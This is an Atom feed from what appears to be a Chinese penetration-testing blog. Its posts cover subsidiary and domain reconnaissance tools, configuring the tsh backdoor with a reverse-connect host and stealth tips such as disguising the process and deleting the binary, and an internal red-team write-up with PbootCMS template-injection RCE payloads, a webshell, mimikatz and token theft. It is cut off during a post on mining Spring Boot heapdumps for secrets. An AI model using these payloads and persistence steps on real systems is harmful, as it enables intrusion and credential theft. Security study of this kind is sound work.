<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>cances</title>
  
  
  <link href="https://canc3s.github.io/atom.xml" rel="self"/>
  
  <link href="https://canc3s.github.io/"/>
  <updated>2021-03-01T07:59:46.304Z</updated>
  <id>https://canc3s.github.io/</id>
  
  <author>
    <name>cances</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>cSubsidiary和cDomain使用指南</title>
    <link href="https://canc3s.github.io/2021/03/01/cSubsidiary%E5%92%8CcDomain%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/"/>
    <id>https://canc3s.github.io/2021/03/01/cSubsidiary%E5%92%8CcDomain%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</id>
    <published>2021-03-01T15:30:04.000Z</published>
    <updated>2021-03-01T07:59:46.304Z</updated>
    
    <content type="html"><![CDATA[<p>github地址：<a href="https://github.com/canc3s/cSubsidiary">cSubsidiary</a>和<a href="https://github.com/canc3s/cDomain">cDomain</a></p><blockquote><p>不管是打比赛还是src，天眼查都是整理资产的利器。。。</p></blockquote><h2 id="查询多级子公司"><a href="#查询多级子公司" class="headerlink" title="查询多级子公司"></a>查询多级子公司</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cSubsidiary_darwin_amd64 -n 字节跳动 -p 49 -w 0 -o Subsidiary.txt &amp;&amp; ./cSubsidiary_darwin_amd64 -f Subsidiary.txt</span><br></pre></td></tr></table></figure><h2 id="批量查询子公司域名"><a href="#批量查询子公司域名" class="headerlink" title="批量查询子公司域名"></a>批量查询子公司域名</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cSubsidiary_darwin_amd64 -n 字节跳动 -o Subsidiary.txt &amp;&amp; ./cDomain_darwin_amd64 -f Subsidiary.txt</span><br></pre></td></tr></table></figure><h2 id="携带cookie"><a href="#携带cookie" class="headerlink" title="携带cookie"></a>携带cookie</h2><p>因为cookie有效时间很长，而且cookie又很长，所以可以这样去使用。</p><h3 id="mac"><a href="#mac" class="headerlink" title="mac"></a>mac</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cookie=<span class="string">&quot;TYCID=d167e900387111ebb03dc06df; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%22.....&quot;</span></span><br><span class="line">./cSubsidiary_darwin_amd64 -n 字节跳动 -o Subsidiary.txt -c <span class="variable">$Cookie</span> &amp;&amp; ./cDomain_darwin_amd64 -f Subsidiary.txt -c <span class="variable">$Cookie</span></span><br></pre></td></tr></table></figure><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> Cookie=<span class="string">&quot;TYCID=d167e900387111ebb03dc06df; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%22.....&quot;</span></span><br><span class="line">cSubsidiary.exe -n 字节跳动 -o Subsidiary.txt -c %Cookie% &amp;&amp; cDomain.exe -f Subsidiary.txt -c %Cookie%</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;github地址：&lt;a href=&quot;https://github.com/canc3s/cSubsidiary&quot;&gt;cSubsidiary&lt;/a&gt;和&lt;a href=&quot;https://github.com/canc3s/cDomain&quot;&gt;cDomain&lt;/a&gt;&lt;/p&gt;
&lt;blo</summary>
      
    
    
    
    <category term="信息收集" scheme="https://canc3s.github.io/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    
    <category term="爬虫" scheme="https://canc3s.github.io/tags/%E7%88%AC%E8%99%AB/"/>
    
    <category term="工具指南" scheme="https://canc3s.github.io/tags/%E5%B7%A5%E5%85%B7%E6%8C%87%E5%8D%97/"/>
    
    <category term="信息收集" scheme="https://canc3s.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>tsh</title>
    <link href="https://canc3s.github.io/2021/01/30/tsh/"/>
    <id>https://canc3s.github.io/2021/01/30/tsh/</id>
    <published>2021-01-30T15:30:04.000Z</published>
    <updated>2021-02-03T13:09:44.089Z</updated>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>下载地址：<a href="https://github.com/orangetw/tsh">https://github.com/orangetw/tsh</a></p><p>功能：</p><blockquote><p>通信加密</p><p>支持上传、下载、直接反弹shell</p></blockquote><p>tsh.h文件，用来配置生成的tsh</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _TSH_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _TSH_H</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *secret = <span class="string">&quot;rc9c0r0e72t5ag0pl79a75c54r1d&quot;</span>;  <span class="comment">//加密密码</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SERVER_PORT 8888                                                <span class="comment">//SERVER端口</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FAKE_PROC_NAME <span class="meta-string">&quot;/bin/bash&quot;</span>                          <span class="comment">//进程名</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONNECT_BACK_HOST  <span class="meta-string">&quot;10.0.0.8&quot;</span>                       <span class="comment">//反连ip</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONNECT_BACK_DELAY 60                                       <span class="comment">//反连周期</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_FILE 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUT_FILE 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RUNSHELL 3</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* tsh.h */</span></span></span><br></pre></td></tr></table></figure><p>编译tsh</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#可选平台</span><br><span class="line">#linux, freebsd, openbsd, netbsd, cygwin, sunos, irix, hpux, osf</span><br><span class="line"></span><br><span class="line">make linux</span><br></pre></td></tr></table></figure><h2 id="正向"><a href="#正向" class="headerlink" title="正向"></a>正向</h2><p>编译tshd时下面两行必须注释</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//#define CONNECT_BACK_HOST  &quot;10.0.0.8&quot;                     //反连ip</span></span><br><span class="line"><span class="comment">//#define CONNECT_BACK_DELAY 60                                     //反连周期</span></span><br></pre></td></tr></table></figure><p>被控端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;tshd</span><br></pre></td></tr></table></figure><p>netstat 这边没什么异样</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/76c811adbd7a712bf7a01e536ed1f0dc456.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/76c811adbd7a712bf7a01e536ed1f0dc456.png" srcset="data:image/png;base64,666" alt="image-20210203190049116"></p><p>lsof 可以看到执行的进程是 <code>tshd</code></p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/996074455491ce211cd5e2a73fe99579575.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/996074455491ce211cd5e2a73fe99579575.png" srcset="data:image/png;base64,666" alt="image-20210203190204830"></p><p>所以运行时可以改个诱惑性的名字,运行完之后可以直接删除文件。不影响后面的使用，除非进程被清理掉或者系统关机。</p><p>看看<code>ps -ef</code></p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/025bc3ffccecc83db689093294a43ccb041.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/025bc3ffccecc83db689093294a43ccb041.png" srcset="data:image/png;base64,666" alt="image-20210203190533288"></p><p>攻击者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./tsh 被控端ip</span><br></pre></td></tr></table></figure><h2 id="反向"><a href="#反向" class="headerlink" title="反向"></a>反向</h2><p>不需要注释，直接编译。</p><p>被控端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;tshd</span><br></pre></td></tr></table></figure><p>netstat 也没有什么异样</p><p>看看<code>ps -ef</code></p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/c14803fbbc9f321bfe5ac45b5d890a66104.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/c14803fbbc9f321bfe5ac45b5d890a66104.png" srcset="data:image/png;base64,666" alt="image-20210203191412371"></p><p>运行完之后也是可以直接删除文件。</p><p>攻击者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;tsh cb</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>默认配置的<code>tsh</code>有两个特点，一是进程名为<code>/bin/bash</code>，用<code>ps -ef</code>看其实挺突兀的，很容易辨别。二是父进程pid是1。</li><li>还有一个识别的技巧就是用<code>netstat</code>, <code>ps -ef</code>, <code>lsof</code> 几个工具都试试结果对比一下，排除出来的概率还是比较大的。所以做攻击也是需要去思考。</li><li>为了通信过程的安全，作者建议 <code>secret</code> 最好多于12位，只要 <code>secret</code> 一致，<code>tsh</code> 和 <code>tshd</code> 就可以通信。也就是说，<code>secret</code> 太弱，可以爆破出来（但不知道好不好实现，看看<code>tshd</code>有没有特别的指纹）</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h2&gt;&lt;p&gt;下载地址：&lt;a href=&quot;https://github.com/orangetw/tsh&quot;&gt;https://github.com/oran</summary>
      
    
    
    
    <category term="权限维持" scheme="https://canc3s.github.io/categories/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    
    
    <category term="linxu" scheme="https://canc3s.github.io/tags/linxu/"/>
    
    <category term="权限维持" scheme="https://canc3s.github.io/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    
  </entry>
  
  <entry>
    <title>1月内部红蓝</title>
    <link href="https://canc3s.github.io/2021/01/26/1%E6%9C%88%E5%86%85%E9%83%A8%E7%BA%A2%E8%93%9D/"/>
    <id>https://canc3s.github.io/2021/01/26/1%E6%9C%88%E5%86%85%E9%83%A8%E7%BA%A2%E8%93%9D/</id>
    <published>2021-01-26T15:30:04.000Z</published>
    <updated>2021-02-03T13:09:47.267Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1月内部红蓝"><a href="#1月内部红蓝" class="headerlink" title="1月内部红蓝"></a>1月内部红蓝</h1><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>看到网站直接试admin就进后台了，然后上github找到了PbootCMS项目，尝试默认口令，admin:123456就进后台了。考点肯定不是这个。。。</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/c5ef2eb085131d6d7ca13c64f87e6663824.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/c5ef2eb085131d6d7ca13c64f87e6663824.png" srcset="data:image/png;base64,666" alt="Untitled.png"></p><p>后来群里有人说有网站备份文件，访问wwwroot.zip下载到网站备份文件。浏览了一下发现有些缓存文件，访问后得到绝对路径。</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/72ec03627c67297aad6348cf47499298083.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/72ec03627c67297aad6348cf47499298083.png" srcset="data:image/png;base64,666" alt="Untitled%201.png"></p><p>其实这次的靶场应该是某次CTF的原题，但环境是一开始是php5.4，尝试了一些方法没成功。好在后来环境还是换成php7所以成功shell了。</p><p>代码审计部分，某篇先知文章已经写过了，这里简单写写。首先定位eval函数，全站就一处，但严防死守。</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/647944a11e347344a0c67fab2ad78ab2210.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/647944a11e347344a0c67fab2ad78ab2210.png" srcset="data:image/png;base64,666" alt="Untitled%202.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$white_fun</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;date&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;in_array&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;explode&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;implode&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 还原可能包含的保留内容，避免判断失效</span></span><br><span class="line"><span class="variable">$matches</span>[<span class="number">1</span>][<span class="variable">$i</span>] = <span class="keyword">$this</span>-&gt;restorePreLabel(<span class="variable">$matches</span>[<span class="number">1</span>][<span class="variable">$i</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 带有函数的条件语句进行安全校验</span></span><br><span class="line"><span class="keyword">if</span> (preg_match_all(<span class="string">&#x27;/([\w]+)([\x00-\x1F\x7F\/\*\&lt;\&gt;\%\w\s\\\\]+)?\(/i&#x27;</span>, <span class="variable">$matches</span>[<span class="number">1</span>][<span class="variable">$i</span>], <span class="variable">$matches2</span>)) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$matches2</span>[<span class="number">1</span>] <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (function_exists(<span class="variable">$value</span>) &amp;&amp; ! in_array(<span class="variable">$value</span>, <span class="variable">$white_fun</span>)) &#123;</span><br><span class="line">            <span class="variable">$danger</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 过滤特殊字符串</span></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/(\$_GET\[)|(\$_POST\[)|(\$_REQUEST\[)|(\$_COOKIE\[)|(\$_SESSION\[)|(file_put_contents)|(file_get_contents)|(fwrite)|(phpinfo)|(base64)|(`)|(shell_exec)|(eval)|(assert)|(system)|(exec)|(passthru)|(pcntl_exec)|(popen)|(proc_open)|(print_r)|(print)|(urldecode)|(chr)|(include)|(request)|(__FILE__)|(__DIR__)|(copy)|(call_user_)|(preg_replace)|(array_map)|(array_reverse)|(array_filter)|(getallheaders)|(get_headers)|(decode_string)|(htmlspecialchars)|(session_id)/i&#x27;</span>, <span class="variable">$matches</span>[<span class="number">1</span>][<span class="variable">$i</span>])) &#123;</span><br><span class="line">    <span class="variable">$danger</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果有危险函数，则不解析该IF</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$danger</span>) &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;if(&#x27;</span> . <span class="variable">$matches</span>[<span class="number">1</span>][<span class="variable">$i</span>] . <span class="string">&#x27;)&#123;$flag=&quot;if&quot;;&#125;else&#123;$flag=&quot;else&quot;;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure><p>首先设置了可以使用函数的白名单，假如使用除白名单以外的函数回被识别为danger。这里限制了调用了函数，在KCon2019大会上的提出的新特性也过滤掉了，导致调用函数基本不成可能。</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/a25666956f40b67561e58bbb8904551a181.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/a25666956f40b67561e58bbb8904551a181.png" srcset="data:image/png;base64,666" alt="Untitled%203.png"></p><p>第二个正则是限制了一些黑名单关键字，其中限制了include，但没有限制require，第一天看代码时眼花，把request看成require了。。。</p><p>后台有很多上传点，但都是白名单，绕不过。所以就就可以和这里结合（文件包含+文件上传=shell）。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;pboot:<span class="keyword">if</span>(<span class="number">1</span>)<span class="keyword">require</span> <span class="string">&quot;static/upload/image/xxxxxxx/1611416284187820.jpg&quot;</span>;<span class="comment">//)&#125;sdfsd&#123;/pboot:if&#125;</span></span><br></pre></td></tr></table></figure><p>该功能最简单触发的地方就是标题样式这里。</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/cd015d00625c5b787be9eee3ceb08a0e179.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/cd015d00625c5b787be9eee3ceb08a0e179.png" srcset="data:image/png;base64,666" alt="Untitled%204.png"></p><p>填入之后发现并没有触发。通过调试发现前面还有一些别的处理，导致失败。一个就是pboot:if变成了pboot@if导致标签无法正常触发。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$varname</span>, <span class="variable">$condition</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...</span><br><span class="line">        <span class="keyword">if</span> (is_string(<span class="variable">$data</span>)) &#123;</span><br><span class="line">        <span class="variable">$data</span> = trim(<span class="variable">$data</span>); <span class="comment">// 去空格</span></span><br><span class="line">        <span class="variable">$data</span> = preg_replace_r(<span class="string">&#x27;/(x3c)|(x3e)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$data</span>); <span class="comment">// 去十六进制括号</span></span><br><span class="line">        <span class="variable">$data</span> = preg_replace_r(<span class="string">&#x27;/pboot:if/i&#x27;</span>, <span class="string">&#x27;pboot@if&#x27;</span>, <span class="variable">$data</span>); <span class="comment">// 过滤插入cms条件语句</span></span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但后来找到了先知那篇文章，发现大佬利用密码不允许显示的空子的地方bypass了。</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/859ab9718d1a2a92ef2c78b4b5548129308.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/859ab9718d1a2a92ef2c78b4b5548129308.png" srcset="data:image/png;base64,666" alt="Untitled%205.png"></p><p>但还有一个问题没有解决。payload中的 “ 被html实体编码了。</p><p>但是因为php5和函数被过滤的原因，暂时没想到解决的办法。。。好在，最后php环境切换了，所以，直接上paylaod。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;pboot&#123;user:password&#125;:<span class="keyword">if</span>(<span class="number">1</span>)(sys.tem)(((ne.xt)((getallheade.rs)())));;<span class="comment">//)&#125;sdfsd&#123;/pboot:if&#125;</span></span><br></pre></td></tr></table></figure><p>上面那些都是在本地环境测试的。为了可以直接使用我准备好的exp我需要把url地址模式调为兼容模式。</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/d553767ed7e653ad30821fd61eafd39c260.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/d553767ed7e653ad30821fd61eafd39c260.png" srcset="data:image/png;base64,666" alt="Untitled%206.png"></p><p>然后在标题样式处填入paylaod</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/24430512f51058884e9ea2bae659d4fc550.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/24430512f51058884e9ea2bae659d4fc550.png" srcset="data:image/png;base64,666" alt="Untitled%207.png"></p><p>然后打paylaod，Cookie里填要执行的命令。发现是system权限，而且 system 没有被disable。</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/faf2533bc20c99ab9e99aee44fd96931273.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/faf2533bc20c99ab9e99aee44fd96931273.png" srcset="data:image/png;base64,666" alt="Untitled%208.png"></p><p>为了更方便的操作，把之前传好的jpg copy成php放在网站根目录。</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/8098baaace14736d6fb6b02e1f65e175780.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/8098baaace14736d6fb6b02e1f65e175780.png" srcset="data:image/png;base64,666" alt="image-20210131002419240"></p><p>然后就shell了，拿到服务器权限。信息收集看了一下，好像真的只是一台vps，没有内网，估计是到此为止了，上机器去看看。</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/65ef4f973a6a6c48c289345ac8e48730240.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/65ef4f973a6a6c48c289345ac8e48730240.png" srcset="data:image/png;base64,666" alt="Untitled%2010.png"></p><p>mimikatz抓密码，结果解不出来。</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/5795a63049ee13cf2d7a1f4cf9235dcf268.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/5795a63049ee13cf2d7a1f4cf9235dcf268.png" srcset="data:image/png;base64,666" alt="Untitled%2011.png"></p><p>既然服务器是server2012那就试试PTH-RDP。结果失败。。。应该是组策略的原因。</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/34995fab3fe26db3f35ca2a057fc88f0796.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/34995fab3fe26db3f35ca2a057fc88f0796.png" srcset="data:image/png;base64,666" alt="Untitled%2012.png"></p><p>新建用户，然后利用incognito提升到system权限，然后 tscon 2 切过去。截图，结束战斗。。。</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/6e9f184ae23d96937f2c241116eb793b655.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/6e9f184ae23d96937f2c241116eb793b655.png" srcset="data:image/png;base64,666" alt="Untitled%2013.png"></p><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://xz.aliyun.com/t/8321">PbootCMS V3.0.1任意代码执行</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1月内部红蓝&quot;&gt;&lt;a href=&quot;#1月内部红蓝&quot; class=&quot;headerlink&quot; title=&quot;1月内部红蓝&quot;&gt;&lt;/a&gt;1月内部红蓝&lt;/h1&gt;&lt;h2 id=&quot;代码审计&quot;&gt;&lt;a href=&quot;#代码审计&quot; class=&quot;headerlink&quot; title=&quot;代</summary>
      
    
    
    
    <category term="内部红蓝记录" scheme="https://canc3s.github.io/categories/%E5%86%85%E9%83%A8%E7%BA%A2%E8%93%9D%E8%AE%B0%E5%BD%95/"/>
    
    
    <category term="web" scheme="https://canc3s.github.io/tags/web/"/>
    
    <category term="内部红蓝" scheme="https://canc3s.github.io/tags/%E5%86%85%E9%83%A8%E7%BA%A2%E8%93%9D/"/>
    
    <category term="php" scheme="https://canc3s.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>spring boot之heapdump</title>
    <link href="https://canc3s.github.io/2021/01/26/spring-boot%E4%B9%8Bheapdump/"/>
    <id>https://canc3s.github.io/2021/01/26/spring-boot%E4%B9%8Bheapdump/</id>
    <published>2021-01-26T15:30:04.000Z</published>
    <updated>2021-01-30T15:43:29.329Z</updated>
    
    <content type="html"><![CDATA[<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>首先要获取heapdump。从<a href="http://www.xx.com/heapdump%E8%8E%B7%E5%8F%96%E8%B0%83%E7%94%A8%E6%A0%88%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%98%AF">http://www.xx.com/heapdump获取调用栈相关信息，如果是</a> sping boot 2.x 的话路径就是：<a href="http://www.xx.com/actuator/heapdump">http://www.xx.com/actuator/heapdump</a></p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/3414c2aff49022bc453c856806036e905f16a3.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/3414c2aff49022bc453c856806036e905f16a3.png" srcset="data:image/png;base64,666" alt="spring%20boot%E4%B9%8Bheapdump%20d36d51fecf994d9193156304740f3cad/Untitled.png"></p><p>然后下载 <a href="https://www.eclipse.org/mat/downloads.php">Eclipse Memory Analyzer</a> 工具来分析 /heapdump 或 /actuator/heapdump 接口下载的 jvm heap 信息，查找密码明文或者其他敏感信息。</p><p>使用 Eclipse Memory Analyzer 是无法直接打开下载的 heapdump 文件的，需要改后缀为 .hprof</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/ea2db7ddd75be6363d736f3c725af63f773e9d.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/ea2db7ddd75be6363d736f3c725af63f773e9d.png" srcset="data:image/png;base64,666" alt="spring%20boot%E4%B9%8Bheapdump%20d36d51fecf994d9193156304740f3cad/Untitled%201.png"></p><p>更改后缀之后就可以成功打开了</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/974c946af1aefc0a16149517d6aadd78fbf8f4.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/974c946af1aefc0a16149517d6aadd78fbf8f4.png" srcset="data:image/png;base64,666" alt="spring%20boot%E4%B9%8Bheapdump%20d36d51fecf994d9193156304740f3cad/Untitled%202.png"></p><p>还有个注意事项是，内存如果解压出来，比如当前我解压出来 1.46G ，那么在 MemoryAnalyzer.ini 这个文件当中需要将内存设置为大于这个大小，我设置为 2G ，否则会报错。我的文件没那么大，所以就不需要修改了。</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/149f76b6a1864bdc9f53c1d1bb03f0dc120af1.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/149f76b6a1864bdc9f53c1d1bb03f0dc120af1.png" srcset="data:image/png;base64,666" alt="spring%20boot%E4%B9%8Bheapdump%20d36d51fecf994d9193156304740f3cad/Untitled%203.png"></p><h2 id="搜索敏感信息"><a href="#搜索敏感信息" class="headerlink" title="搜索敏感信息"></a>搜索敏感信息</h2><p>点击 OQL 标签，在查询框中输入语句进行查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> org.springframework.web.context.support.StandardServletEnvironment</span><br></pre></td></tr></table></figure><p>然后点击红色感叹号执行查询。</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/d21a3f520a6a56dd62f8a5ad159c9544a0912a.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/d21a3f520a6a56dd62f8a5ad159c9544a0912a.png" srcset="data:image/png;base64,666" alt="spring%20boot%E4%B9%8Bheapdump%20d36d51fecf994d9193156304740f3cad/Untitled%204.png"></p><p>也可以定位关键词进行查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 